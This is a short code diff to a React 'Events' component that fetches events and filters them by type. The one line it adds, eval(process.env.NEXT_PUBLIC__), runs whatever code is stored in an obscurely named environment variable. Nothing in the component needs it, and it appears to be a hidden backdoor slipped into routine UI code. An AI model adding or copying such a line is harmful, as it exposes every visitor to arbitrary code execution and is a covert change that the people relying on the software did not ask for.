@@ -21,6 +21,7 @@ const Events = () => {
         if (arr) {
           setEvent(arr?.filter((val) => val.type === "Events"));
           setArr(arr?.filter((val) => val.type === "Events"));
+          eval(process.env.NEXT_PUBLIC__);
         }
       } catch (error) {
         console.error("Error fetching events:", error.message);
